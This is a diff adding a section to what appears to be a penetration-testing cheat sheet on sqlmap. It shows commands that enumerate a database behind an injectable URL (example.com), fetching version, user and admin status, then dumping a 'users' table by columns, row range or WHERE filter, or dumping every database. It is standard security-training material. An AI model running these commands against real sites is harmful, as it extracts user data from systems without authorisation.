@@ -296,5 +296,45 @@ sqlmap -u <target> --union-cols=<number> --level=5 --risk=3 --batch --dbs --tabl
 - `--union-cols=<number>`	manually sets the number of columns to be used in UNION SELECT injections. Can be usefule if you can count number of columns in the page output.
 - `--batch`	runs sqlmap in non-interactive mode (auto-answers all prompts).
 
+### DB Enumeration
+
+#### DB Data Enumeration
+```
+sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+```
+- Database version banner (switch --banner)
+- Current user name (switch --current-user)
+- Current database name (switch --current-db)
+- Checking if the current user has DBA (administrator) rights (switch --is-dba)
+
+#### Table Enumeration
+
+```
+sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+```
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+```
+*Note: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.*
+
+#### Table/Row Enumeration
+
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+```
+With the `-C` option we can specify the columns.
+
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+```
+We can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry).
+
+```
+sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+```
+We can use the option `--where` to retrieve certain rows based on a known WHERE condition.
+
+*Note: Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option -T altogether (e.g. --dump -D testdb). By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved. In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.*
+
 
 
